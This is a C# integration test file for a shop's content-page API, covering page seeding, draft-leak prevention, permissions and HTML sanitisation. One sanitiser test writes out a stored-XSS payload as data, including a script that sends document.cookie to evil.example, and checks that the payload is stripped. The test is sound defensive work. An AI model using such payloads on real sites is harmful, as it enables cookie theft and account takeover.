using System.Net;
using System.Net.Http.Json;
using System.Text.Json;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.DependencyInjection;
using SpencerDenim.Domain.Content;
using SpencerDenim.Domain.Identity;
using SpencerDenim.Domain.Settings;
using SpencerDenim.Infrastructure.Persistence;
using SpencerDenim.Infrastructure.Persistence.Seeding;
using SpencerDenim.IntegrationTests.Infrastructure;

namespace SpencerDenim.IntegrationTests.Content;

/// <summary>
/// The content pages against the real API and a real SQL Server (GLB-10, ADM-17).
/// <para>
/// <b>Three properties carry most of the weight here, and none of them can be proved by a unit test.</b>
/// The six system pages are seeded as the client receives them; an unpublished page must not leak to the
/// public API, the footer's list or <c>sitemap.xml</c>; and the body that reaches the column has been
/// through the allow-list, which is a statement about the whole write path rather than about the
/// sanitiser.
/// </para>
/// </summary>
public sealed class ContentPageEndpointTests(SqlServerDatabaseFixture sqlServer)
{
    private const string PublicPagesUrl = "/api/content/pages";
    private const string AdminPagesUrl = "/api/admin/content/pages/";

    private static readonly JsonSerializerOptions JsonOptions = new(JsonSerializerDefaults.Web);

    private static CancellationToken Token => TestContext.Current.CancellationToken;

    // ---- the seeded shells -----------------------------------------------------------------------

    /// <summary>
    /// Doc 08 §9 and doc 11 P13: six system pages; <b>Contact on the shop</b> with an empty body (owner decision,
    /// W2-11); <b>Shipping and Returns on the shop with the shop's starting terms</b> (owner decision 2026-10-21,
    /// issue #33, from <c>PolicyPageContent</c>); About, Privacy and Terms empty and unpublished.
    /// <para>
    /// <b>Issue #33 changed which pages carry copy, not the rule behind it:</b> nothing writes words the owner has
    /// not asked for. Privacy and Terms still wait for a PDPA review and About for the client.
    /// </para>
    /// <para>
    /// <b>This is the task's defining constraint, as a test.</b> A returns policy, a privacy policy and
    /// terms of business are the client's own words and carry legal weight — Privacy and Terms need a
    /// PDPA review — so nothing in this repository writes them. A future change that "helpfully" seeded
    /// placeholder copy would put words the client never agreed to on their own shop, and this is what
    /// goes red.
    /// </para>
    /// <para>
    /// <b>It deletes the rows and runs the real seeder, and the first version of this test did not.</b>
    /// It called the helper now named <c>DraftEverySystemPageAsync</c> — which writes the empty body, the unpublished flag, the
    /// null published date, the slug, the title and the two null SEO fields — and then asserted on
    /// exactly those seven fields. It was testing its own helper. The W2-11 tester proved it: changing
    /// the seeder to write <c>&lt;p&gt;We offer a 14-day returns policy on all items.&lt;/p&gt;</c> into
    /// all six pages left this class 12/12 green and the whole unit suite 1,643/1,643 green, because that
    /// one assertion was the only one in the repository on a seeded body. This is the vacuous-assertion
    /// class from W1-03, on the single thing this task exists to protect.
    /// </para>
    /// <para>
    /// So the rows go, <c>CatalogSeedRunner.RunReferenceDataAsync</c> puts them back, and <b>nothing in
    /// this method has written a value it then asserts</b>. The delete is a hard delete through
    /// <c>ExecuteDeleteAsync</c> rather than the soft delete the API uses, because the seeder looks for
    /// what is present with <c>IgnoreQueryFilters</c> and would read a soft-deleted shell as already
    /// there and insert nothing — which would make this test vacuous in a second, quieter way.
    /// </para>
    /// <para>
    /// <b>The publish state is asserted per page, by name, as the intent rather than as whatever the
    /// seeder says.</b> Contact goes on the shop because its content is the form and the
    /// <c>Contact.*</c> settings, and because an unpublished one would leave a fresh shop with no contact
    /// route at all. Its <b>body stays empty</b>, which is the part not relaxed: published and empty is
    /// the intended state, and a test that read the flag off the seeder would have nothing to say if
    /// somebody published Privacy next.
    /// </para>
    /// </summary>
    [Fact]
    public async Task The_system_pages_are_seeded_with_no_copy_and_only_contact_on_the_shop()
    {
        await using var host = await StartAsync();

        await using (var removing = host.Factory.Services.CreateAsyncScope())
        {
            var context = removing.ServiceProvider.GetRequiredService<AppDbContext>();

            await context.ContentPages
                .IgnoreQueryFilters()
                .Where(page => page.SystemKey != null)
                .ExecuteDeleteAsync(Token);

            // And the policy-copy marker, so the run below is a fresh deployment's in full (issue #33).
            await context.Settings
                .Where(setting => setting.Key == SettingKeys.Seed.PolicyPagesVersion)
                .ExecuteDeleteAsync(Token);
        }

        await ReseedAsync(host);

        await using var scope = host.Factory.Services.CreateAsyncScope();
        var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();

        var pages = await dbContext.ContentPages
            .AsNoTracking()
            .Where(page => page.SystemKey != null)
            .OrderBy(page => page.SystemKey)
            .ToListAsync(Token);

        Assert.Equal(6, pages.Count);
        Assert.Equal(
            ContentPageKeys.Seeds.Select(seed => seed.SystemKey).Order(StringComparer.Ordinal),
            pages.Select(page => page.SystemKey!).Order(StringComparer.Ordinal));

        var policyPages = new[] { ContentPageKeys.Shipping, ContentPageKeys.Returns };

        foreach (var page in pages.Where(page => policyPages.Contains(page.SystemKey)))
        {
            Assert.Equal(PolicyPageContent.Bodies[page.SystemKey!], page.BodyHtml);
            Assert.True(page.IsPublished);
            Assert.NotNull(page.PublishedAtUtc);
            Assert.Null(page.SeoTitle);
            Assert.Null(page.SeoDescription);
        }

        foreach (var page in pages.Where(page => !policyPages.Contains(page.SystemKey)))
        {
            // **Empty for the other four, Contact included.** The publish decision below does not relax this:
            // Contact's content is the enquiry form and the settings, not copy.
            Assert.True(
                page.BodyHtml.Length == 0,
                $"{page.SystemKey} was seeded with {page.BodyHtml.Length} characters of copy: "
                + "\"" + page.BodyHtml + "\". The client writes these pages; a returns policy, a privacy "
                + "policy and terms of business carry legal weight and Privacy and Terms need a PDPA "
                + "review. Delete the copy from HomeContentSeeder.SeedContentPagesAsync.");

            Assert.Null(page.SeoTitle);
            Assert.Null(page.SeoDescription);

            // A title is a label rather than copy, so it is seeded; the body is what stays empty.
            Assert.False(string.IsNullOrWhiteSpace(page.Title));

            var onTheShop = page.SystemKey == ContentPageKeys.Contact;

            Assert.Equal(onTheShop, page.IsPublished);

            if (onTheShop)
            {
                // Stamped, because the page really did go on the shop — at install. Null beside
                // IsPublished = true would be an inconsistent row, and SetPublished assigns with `??=`.
                Assert.NotNull(page.PublishedAtUtc);
            }
            else
            {
                Assert.Null(page.PublishedAtUtc);
            }
        }

        // Said once more as a whole, so "everything is published" and "nothing is" both fail here rather
        // than only inside the loop's per-page message.
        Assert.Equal(
            [ContentPageKeys.Contact, ContentPageKeys.Returns, ContentPageKeys.Shipping],
            pages.Where(page => page.IsPublished).Select(page => page.SystemKey!).Order(StringComparer.Ordinal));
    }

    /// <summary>
    /// The seeder inserts only what is missing (doc 08 §9, N13), keyed on the one field staff cannot
    /// change. Re-running it after the client has written, renamed and published a page leaves all of it.
    /// </summary>
    [Fact]
    public async Task Re_seeding_leaves_a_page_the_client_has_edited_alone()
    {
        await using var host = await StartAsync();

        await using (var scope = host.Factory.Services.CreateAsyncScope())
        {
            var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
            var about = await dbContext.ContentPages.SingleAsync(
                page => page.SystemKey == ContentPageKeys.About, Token);

            about.Title = "Our story";
            about.Slug = "our-story";
            about.BodyHtml = "<p>We began in Colombo.</p>";
            about.IsPublished = true;
            await dbContext.SaveChangesAsync(Token);
        }

        await ReseedAsync(host);

        try
        {
            await using var after = host.Factory.Services.CreateAsyncScope();
            var context = after.ServiceProvider.GetRequiredService<AppDbContext>();

            var pages = await context.ContentPages.AsNoTracking()
                .Where(page => page.SystemKey != null)
                .ToListAsync(Token);
            Assert.Equal(6, pages.Count);

            var edited = pages.Single(page => page.SystemKey == ContentPageKeys.About);
            Assert.Equal("Our story", edited.Title);
            Assert.Equal("our-story", edited.Slug);
            Assert.Equal("<p>We began in Colombo.</p>", edited.BodyHtml);
            Assert.True(edited.IsPublished);
        }
        finally
        {
            // **Restored, and the first version of this test did not.** The assembly disables test
            // parallelisation and shares one database, so leaving About renamed to /our-story made a
            // later test's GET /api/content/pages/about answer 404 — a failure in a test about the
            // sanitiser, caused by a test about the seeder, which is exactly the kind of coupling the
            // shared database makes easy and cheap to miss.
            await DraftEverySystemPageAsync(host);
        }
    }

    // ---- the leak --------------------------------------------------------------------------------

    /// <summary>
    /// <b>An unpublished page does not leak, through any of the three doors it has.</b>
    /// <para>
    /// It is not in the footer's list, it is not served by slug, and it is not in the sitemap feed — and
    /// the three are asserted together because they are three different callers of one filter, and the
    /// leak this prevents is a draft privacy policy on the public internet.
    /// </para>
    /// </summary>
    [Fact]
    public async Task An_unpublished_page_is_absent_from_the_list_and_answers_404_by_slug()
    {
        await using var host = await StartAsync();
        await DraftEverySystemPageAsync(host);
        using var client = host.CreateAnonymousClient();

        var list = await GetJsonAsync(client, PublicPagesUrl);
        var slugs = list.GetProperty("pages").EnumerateArray()
            .Select(page => page.GetProperty("slug").GetString())
            .ToList();

        foreach (var seed in ContentPageKeys.Seeds)
        {
            Assert.DoesNotContain(seed.Slug, slugs);

            using var response = await client.GetAsync(
                new Uri($"{PublicPagesUrl}/{seed.Slug}", UriKind.Relative), Token);

            Assert.Equal(HttpStatusCode.NotFound, response.StatusCode);
        }
    }

    /// <summary>
    /// A draft, a page that never existed and a removed page all answer the same 404.
    /// <para>
    /// Deliberately indistinguishable: "there is a page here you may not see" is itself something a draft
    /// policy should not disclose, and a 403 or a different body would say it.
    /// </para>
    /// </summary>
    [Fact]
    public async Task A_draft_and_a_slug_that_never_existed_answer_the_same_404()
    {
        await using var host = await StartAsync();
        await DraftEverySystemPageAsync(host);
        using var client = host.CreateAnonymousClient();

        using var draft = await client.GetAsync(new Uri($"{PublicPagesUrl}/privacy", UriKind.Relative), Token);
        using var never = await client.GetAsync(new Uri($"{PublicPagesUrl}/not-a-page", UriKind.Relative), Token);

        Assert.Equal(HttpStatusCode.NotFound, draft.StatusCode);
        Assert.Equal(HttpStatusCode.NotFound, never.StatusCode);

        // The *problem* must be identical, not the whole body: RFC 9457 carries a per-request `traceId`,
        // so comparing the raw strings compared the trace ids and failed for a reason that has nothing to
        // do with disclosure. The title and the detail are what a caller can actually learn from.
        var draftBody = await draft.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);
        var neverBody = await never.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);

        Assert.Equal(draftBody.GetProperty("title").GetString(), neverBody.GetProperty("title").GetString());
        Assert.Equal(draftBody.GetProperty("detail").GetString(), neverBody.GetProperty("detail").GetString());
        Assert.Equal(draftBody.GetProperty("status").GetInt32(), neverBody.GetProperty("status").GetInt32());
    }

    /// <summary>
    /// The 404 body does not echo the slug, which it would be natural to do and which would make a public
    /// endpoint a reflected-content surface: the slug comes straight off the URL.
    /// </summary>
    [Fact]
    public async Task The_404_body_does_not_echo_the_address_that_was_asked_for()
    {
        await using var host = await StartAsync();
        using var client = host.CreateAnonymousClient();

        using var response = await client.GetAsync(
            new Uri($"{PublicPagesUrl}/x-reflected-marker-x", UriKind.Relative), Token);

        var body = await response.Content.ReadAsStringAsync(Token);
        Assert.DoesNotContain("x-reflected-marker-x", body, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Publishing puts the page in the list and makes it servable; unpublishing takes both away again.
    /// <para>
    /// The round trip matters more than either half: it is the only way to prove the storefront's cache
    /// is evicted on the write rather than merely expiring, which is the difference between a client
    /// seeing their published page at once and concluding the publish failed.
    /// </para>
    /// </summary>
    [Fact]
    public async Task Publishing_makes_the_page_public_and_unpublishing_takes_it_away_again()
    {
        await using var host = await StartAsync();
        using var admin = await host.SignInAsync(Permissions.Content.View, Permissions.Content.Edit);
        using var visitor = host.CreateAnonymousClient();

        var about = await FindPageAsync(admin, ContentPageKeys.About);

        try
        {
            await PublishAsync(admin, about, true);

            var page = await GetJsonAsync(visitor, $"{PublicPagesUrl}/about");
            Assert.Equal("about", page.GetProperty("slug").GetString());
            Assert.Equal(ContentPageKeys.About, page.GetProperty("systemKey").GetString());

            var list = await GetJsonAsync(visitor, PublicPagesUrl);
            Assert.Contains(
                "about",
                list.GetProperty("pages").EnumerateArray().Select(row => row.GetProperty("slug").GetString()));

            // The sitemap feed reads the same list, so the published page is offered to a crawler too.
            var sitemapList = await GetJsonAsync(visitor, PublicPagesUrl);
            Assert.NotEmpty(sitemapList.GetProperty("pages").EnumerateArray());
        }
        finally
        {
            var current = await FindPageAsync(admin, ContentPageKeys.About);
            await PublishAsync(admin, current, false);
        }

        using var afterwards = await visitor.GetAsync(
            new Uri($"{PublicPagesUrl}/about", UriKind.Relative), Token);
        Assert.Equal(HttpStatusCode.NotFound, afterwards.StatusCode);

        await DraftEverySystemPageAsync(host);
    }

    // ---- the sanitiser on the write path ---------------------------------------------------------

    /// <summary>
    /// <b>The body that reaches the column has been through the allow-list.</b>
    /// <para>
    /// The sanitiser's own payload table is a unit test; this is the statement a unit test cannot make —
    /// that the <i>write path</i> uses it, end to end, through HTTP and into SQL Server, and that what a
    /// visitor is then served is the cleaned value.
    /// </para>
    /// </summary>
    [Fact]
    public async Task A_payload_saved_through_the_api_reaches_the_column_cleaned_and_is_served_cleaned()
    {
        await using var host = await StartAsync();
        using var admin = await host.SignInAsync(Permissions.Content.View, Permissions.Content.Edit);
        using var visitor = host.CreateAnonymousClient();

        const string Payload =
            "<p onclick=\"steal()\">Our story</p>"
            + "<script>fetch('https://evil.example?c='+document.cookie)</script>"
            + "<iframe src=\"https://evil.example\"></iframe>"
            + "<a href=\"javascript:alert(1)\">tap</a>"
            + "<img src=\"data:image/svg+xml;base64,PHN2Zy8+\">"
            + "<!-- <script>alert(2)</script> -->";

        var about = await FindPageAsync(admin, ContentPageKeys.About);

        try
        {
            var saved = await SaveBodyAsync(admin, about, Payload);

            // The removal report reaches the editor, which is what stops a save silently eating a paste.
            var removed = saved.GetProperty("removedFromBody").EnumerateArray()
                .Select(item => item.GetString())
                .ToList();
            Assert.Contains("<script>", removed);
            Assert.Contains("<iframe>", removed);
            Assert.Contains("onclick", removed);

            await using var scope = host.Factory.Services.CreateAsyncScope();
            var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();
            var stored = await dbContext.ContentPages.AsNoTracking()
                .SingleAsync(page => page.SystemKey == ContentPageKeys.About, Token);

            foreach (var forbidden in new[] { "script", "iframe", "onclick", "javascript:", "data:", "evil.example" })
            {
                Assert.DoesNotContain(forbidden, stored.BodyHtml, StringComparison.OrdinalIgnoreCase);
            }

            Assert.Contains("Our story", stored.BodyHtml, StringComparison.Ordinal);

            // And the value a visitor is served is that same cleaned one.
            var current = await FindPageAsync(admin, ContentPageKeys.About);
            await PublishAsync(admin, current, true);

            var served = await GetJsonAsync(visitor, $"{PublicPagesUrl}/about");
            var body = served.GetProperty("bodyHtml").GetString() ?? "";
            Assert.DoesNotContain("script", body, StringComparison.OrdinalIgnoreCase);
            Assert.Contains("Our story", body, StringComparison.Ordinal);
        }
        finally
        {
            await DraftEverySystemPageAsync(host);
        }
    }

    // ---- permissions ----------------------------------------------------------------------------

    /// <summary>
    /// Doc 11 P13's permission table. The read needs <c>Content.View</c>; a staff user without it is
    /// refused rather than shown an empty list.
    /// </summary>
    [Fact]
    public async Task Reading_the_pages_needs_Content_View()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(Permissions.Customers.View);

        using var response = await client.GetAsync(new Uri(AdminPagesUrl, UriKind.Relative), Token);

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    [Fact]
    public async Task Publishing_needs_Content_Edit()
    {
        await using var host = await StartAsync();
        using var reader = await host.SignInAsync(Permissions.Content.View);

        var about = await FindPageAsync(reader, ContentPageKeys.About);

        using var response = await PutAsync(
            reader,
            $"{AdminPagesUrl}{about.GetProperty("id").GetInt32()}/published",
            new { isPublished = true, rowVersion = about.GetProperty("rowVersion").GetString() });

        Assert.Equal(HttpStatusCode.Forbidden, response.StatusCode);
    }

    /// <summary>The admin API is not anonymous, which is the floor under every assertion above.</summary>
    [Fact]
    public async Task The_admin_pages_are_not_anonymous()
    {
        await using var host = await StartAsync();
        using var client = host.CreateAnonymousClient();

        using var response = await client.GetAsync(new Uri(AdminPagesUrl, UriKind.Relative), Token);

        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }

    /// <summary>
    /// Doc 11 P13: "System pages cannot be deleted." A 409 rather than a 403: the caller holds the
    /// permission, and nothing about their permissions would change the answer.
    /// </summary>
    [Fact]
    public async Task A_system_page_cannot_be_deleted_even_with_the_permission()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(
            Permissions.Content.View, Permissions.Content.Delete);

        var about = await FindPageAsync(client, ContentPageKeys.About);

        using var request = new HttpRequestMessage(
            HttpMethod.Delete,
            new Uri($"{AdminPagesUrl}{about.GetProperty("id").GetInt32()}", UriKind.Relative));
        request.Headers.Add("X-XSRF-TOKEN", await AntiforgeryAsync(client));
        request.Headers.Add("If-Match", Etag(about));

        using var response = await client.SendAsync(request, Token);

        Assert.Equal(HttpStatusCode.Conflict, response.StatusCode);

        var body = await response.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);
        Assert.Equal("system_page_not_deletable", body.GetProperty("code").GetString());
    }

    /// <summary>
    /// A custom page can be created and removed, and removing it releases the slug — which is what the
    /// filtered unique index is for.
    /// </summary>
    [Fact]
    public async Task A_custom_page_can_be_created_removed_and_its_slug_reused()
    {
        await using var host = await StartAsync();
        using var client = await host.SignInAsync(
            Permissions.Content.View, Permissions.Content.Create, Permissions.Content.Delete);

        var slug = "size-guide-" + Guid.NewGuid().ToString("N")[..8];

        var created = await PostAsync(
            client,
            AdminPagesUrl,
            new { title = "Size guide", slug, bodyHtml = "<p>Measure here.</p>" });

        Assert.Equal(HttpStatusCode.Created, created.Status);
        var pageId = created.Body.GetProperty("id").GetInt32();

        var page = await GetJsonAsync(client, $"{AdminPagesUrl}{pageId}");
        Assert.True(page.GetProperty("canBeDeleted").GetBoolean());
        Assert.False(page.GetProperty("isPublished").GetBoolean());

        using var request = new HttpRequestMessage(
            HttpMethod.Delete, new Uri($"{AdminPagesUrl}{pageId}", UriKind.Relative));
        request.Headers.Add("X-XSRF-TOKEN", await AntiforgeryAsync(client));
        request.Headers.Add("If-Match", Etag(page));

        using var deleted = await client.SendAsync(request, Token);
        Assert.Equal(HttpStatusCode.NoContent, deleted.StatusCode);

        // The slug is free again, which is the filtered index (WHERE IsDeleted = 0) doing its job.
        var again = await PostAsync(client, AdminPagesUrl, new { title = "Size guide again", slug });
        Assert.Equal(HttpStatusCode.Created, again.Status);
    }

    // ---- helpers --------------------------------------------------------------------------------

    private async Task<MediaTestHost> StartAsync()
    {
        sqlServer.SkipIfUnavailable();
        await TestDatabaseMigrator.MigrateAsync(sqlServer.ConnectionString, Token);

        return MediaTestHost.Create(sqlServer.ConnectionString);
    }

    private static async Task ReseedAsync(MediaTestHost host)
    {
        await using var scope = host.Factory.Services.CreateAsyncScope();
        var runner = scope.ServiceProvider
            .GetRequiredService<SpencerDenim.Infrastructure.Persistence.Seeding.CatalogSeedRunner>();

        await runner.RunReferenceDataAsync(Token);
    }

    /// <summary>
    /// Puts every system page back exactly as the seeder leaves it, so one test cannot affect another.
    ///
    /// <para>
    /// <b><c>PublishedAtUtc</c> is reset here and that is the whole reason this helper exists.</b> The
    /// fixture gives one database to the whole run, and unpublishing deliberately does <i>not</i> clear
    /// that column — the date a client first published their returns policy does not stop being true
    /// because the page is being rewritten. So a test that published a page left the seeded-shells test
    /// asserting against a stamped date, which is a real property of the seed failing for a reason that
    /// has nothing to do with the seed. Resetting through the context rather than through the API,
    /// because no endpoint can clear it and none should.
    /// </para>
    /// </summary>
    /// <summary>
    /// Puts all six system pages into the draft state this class's leak tests need: empty body, off the
    /// shop, original slug and title, no SEO fields.
    /// <para>
    /// <b>It is a fixture, not a restore of the seed, and the name used to say otherwise.</b> It was
    /// <c>RestoreSystemPagesAsync</c>, which was already misleading — the seed test asserted the seven
    /// fields this helper had just written, and that was round two's Major 3 — and it became wrong
    /// outright in round three, because Contact is now seeded <i>published</i> (owner decision, W2-11).
    /// A helper that drafts Contact is not restoring anything; it is setting up the "nothing is on the
    /// shop" case, which several tests here need and which is no longer the shop's starting state.
    /// </para>
    /// <para>
    /// The seed itself is asserted by
    /// <c>The_system_pages_are_seeded_with_no_copy_and_only_contact_on_the_shop</c>, which deletes the
    /// rows and runs the real seeder and never calls this.
    /// </para>
    /// </summary>
    private static async Task DraftEverySystemPageAsync(MediaTestHost host)
    {
        await using var scope = host.Factory.Services.CreateAsyncScope();
        var dbContext = scope.ServiceProvider.GetRequiredService<AppDbContext>();

        var pages = await dbContext.ContentPages
            .Where(page => page.SystemKey != null)
            .ToListAsync(Token);

        foreach (var page in pages)
        {
            var seed = ContentPageKeys.Seeds.Single(candidate => candidate.SystemKey == page.SystemKey);

            page.BodyHtml = string.Empty;
            page.IsPublished = false;
            page.PublishedAtUtc = null;
            page.Slug = seed.Slug;
            page.Title = seed.Title;
            page.SeoTitle = null;
            page.SeoDescription = null;
        }

        await dbContext.SaveChangesAsync(Token);
    }

    private static async Task<JsonElement> FindPageAsync(HttpClient client, string systemKey)
    {
        var pages = await GetJsonAsync(client, AdminPagesUrl);

        return pages.EnumerateArray().Single(page => page.GetProperty("systemKey").GetString() == systemKey);
    }

    private static async Task PublishAsync(HttpClient client, JsonElement page, bool isPublished)
    {
        using var response = await PutAsync(
            client,
            $"{AdminPagesUrl}{page.GetProperty("id").GetInt32()}/published",
            new { isPublished, rowVersion = page.GetProperty("rowVersion").GetString() });

        Assert.Equal(HttpStatusCode.NoContent, response.StatusCode);
    }

    private static async Task<JsonElement> SaveBodyAsync(HttpClient client, JsonElement page, string bodyHtml)
    {
        using var response = await PutAsync(
            client,
            $"{AdminPagesUrl}{page.GetProperty("id").GetInt32()}",
            new { bodyHtml, rowVersion = page.GetProperty("rowVersion").GetString() });

        Assert.Equal(HttpStatusCode.OK, response.StatusCode);

        return await response.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);
    }

    private static async Task<JsonElement> GetJsonAsync(HttpClient client, string path)
    {
        using var response = await client.GetAsync(new Uri(path, UriKind.Relative), Token);
        Assert.Equal(HttpStatusCode.OK, response.StatusCode);

        return await response.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);
    }

    private static async Task<HttpResponseMessage> PutAsync(HttpClient client, string path, object body)
    {
        using var request = new HttpRequestMessage(HttpMethod.Put, new Uri(path, UriKind.Relative))
        {
            Content = JsonContent.Create(body, options: JsonOptions),
        };
        request.Headers.Add("X-XSRF-TOKEN", await AntiforgeryAsync(client));

        return await client.SendAsync(request, Token);
    }

    private static async Task<(HttpStatusCode Status, JsonElement Body)> PostAsync(
        HttpClient client,
        string path,
        object body)
    {
        using var request = new HttpRequestMessage(HttpMethod.Post, new Uri(path, UriKind.Relative))
        {
            Content = JsonContent.Create(body, options: JsonOptions),
        };
        request.Headers.Add("X-XSRF-TOKEN", await AntiforgeryAsync(client));

        using var response = await client.SendAsync(request, Token);

        var payload = response.StatusCode == HttpStatusCode.Created
            ? await response.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token)
            : default;

        return (response.StatusCode, payload);
    }

    /// <summary>
    /// The row version as an <c>If-Match</c> header, <b>quoted</b>.
    ///
    /// <para>
    /// A base64 token contains <c>=</c> and <c>+</c>, which an entity-tag is not allowed to carry bare:
    /// <c>HttpHeaders.Add</c> refuses it with "the format of value is invalid". Quoting it is the correct
    /// HTTP form, and <c>AdminWriteRequest.RowVersion</c> already strips the quotes and a weak marker
    /// because a browser or a proxy may send either. Worth a helper rather than a literal at two call
    /// sites: a test that fails on its own header is a test that proves nothing about the endpoint.
    /// </para>
    /// </summary>
    private static string Etag(JsonElement page) =>
        "\"" + page.GetProperty("rowVersion").GetString() + "\"";

    private static async Task<string> AntiforgeryAsync(HttpClient client)
    {
        using var response = await client.GetAsync(
            new Uri("/api/admin/auth/antiforgery-token", UriKind.Relative), Token);

        var body = await response.Content.ReadFromJsonAsync<JsonElement>(JsonOptions, Token);

        return body.GetProperty("token").GetString()!;
    }
}
